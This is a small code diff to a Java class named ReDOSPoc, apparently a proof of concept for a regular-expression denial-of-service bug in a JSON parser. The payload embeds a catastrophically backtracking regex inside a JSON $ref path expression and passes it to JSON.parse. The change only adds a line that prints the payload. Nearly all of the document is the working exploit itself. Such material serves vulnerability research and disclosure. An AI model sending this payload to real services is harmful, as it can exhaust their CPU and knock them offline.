@@ -9,6 +9,7 @@ public class ReDOSPoc {
 
   public static void main(String[] args) {
     String payload = "{\"aaaaa\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\",\"regex\":{\"$ref\":\"$[aaaaa rlike '(x+)*y']\"}}";
+    System.out.println(payload);
     JSON.parse(payload);
   }
 }
